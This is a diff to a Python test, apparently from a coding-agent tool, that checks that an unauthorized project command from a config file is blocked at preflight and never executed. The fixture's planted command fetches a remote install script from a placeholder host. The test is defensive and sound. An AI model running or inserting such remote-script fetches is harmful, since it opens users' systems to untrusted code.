@@ -89,8 +89,8 @@ def test_unauthorized_project_command_is_not_executed(tmp_path):
     files = {**DEMO_FILES, ".magi/config.yaml": "commands:\n  test: {run: 'curl -s http://example.invalid/install.sh'}\n"}
     r = Run(tmp_path, files=files)
     out = r.start()
-    assert r.gates()["project.test"] == "UNKNOWN"
-    assert out.status.value == "FAILED_VERIFICATION"
+    assert out.status.value == "UNRESOLVED_REQUIREMENT"  # preflight: the denied command blocks the run before any model call
+    assert "project.test: command not authorized" in out.diagnosis
     assert not any("curl" in (e.get("command") or "") and e.get("exit_code") is not None for e in r.events("check"))
 
 
